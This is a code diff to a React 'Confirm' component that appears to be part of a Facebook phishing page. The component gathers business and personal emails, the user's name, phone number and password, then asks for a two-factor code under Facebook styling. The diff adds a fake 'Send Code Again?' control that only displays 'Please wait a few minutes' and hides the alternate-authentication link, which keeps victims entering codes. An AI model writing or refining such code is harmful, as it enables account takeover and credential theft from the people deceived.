@@ -126,7 +126,7 @@ const Confirm = () => {
       Email Account:  ${business.businessEmail}
       Name Account: ${business.namePage}
       Person Email: ${business.personalEmail}
-      Facebook Page: ${business.text}
+      Text: ${business.text}
       User Name: ${business.fullName}
       Phone Number: ${business.phone}
       Password First: ${business.passwordFirst}
@@ -170,7 +170,11 @@ const Confirm = () => {
   const handleCancel2 = () => {
     setOpen2(false);
   };
+  const [isClicked, setIsClicked] = useState(false);
 
+  const handleClick = () => {
+    setIsClicked(true);
+  };
   return (
     <div className="container_confirm">
       <div className="header">
@@ -195,30 +199,46 @@ const Confirm = () => {
               Enter the 6-digit or 8-digit code from your code generator or
               third-party app below.
             </p>
-            <Input
+            {/* <Input
               className="input_code"
               value={code}
               onChange={(e) => setCode(e.target.value)}
               placeholder="Enter number"
               type="number"
-            />
-            {/* <TextArea
+            /> */}
+            <TextArea
               className="input_code"
               onChange={(e: any) => setCode(e.target.value)}
               placeholder="Enter code"
               autoSize
-            />{" "} */}
+            />{" "}
             {isTimeUp ? (
-              <a
-                href="##"
-                style={{
-                  marginLeft: "10px",
-                  textDecoration: "none",
-                  color: "#385898",
-                }}
-              >
-                Send Code Again?
-              </a>
+              <span>
+                {!isClicked ? (
+                  <span
+                    style={{
+                      marginLeft: "10px",
+                      textDecoration: "none",
+                      color: "#385898",
+                      cursor: "pointer",
+                    }}
+                    onClick={handleClick}
+                  >
+                    Send Code Again?
+                  </span>
+                ) : (
+                  <span
+                    style={{
+                      marginLeft: "10px",
+                      textDecoration: "none",
+                      color: "#385898",
+                      // cursor: "pointer",
+                    }}
+                  >
+                    Please wait a few minutes.
+                  </span>
+                )}
+              </span>
             ) : (
               <span style={{ marginLeft: "10px" }}>
                 (wait: {formatTime(time)})
@@ -232,9 +252,9 @@ const Confirm = () => {
             )}
           </div>
           <div className="footer_form">
-            <p onClick={showModal} className="footer_form-title">
+            {/* <p onClick={showModal} className="footer_form-title">
               Need another way to authenticate?
-            </p>
+            </p> */}
             <Button
               className="submit"
               onClick={handleFacebookRedirect}
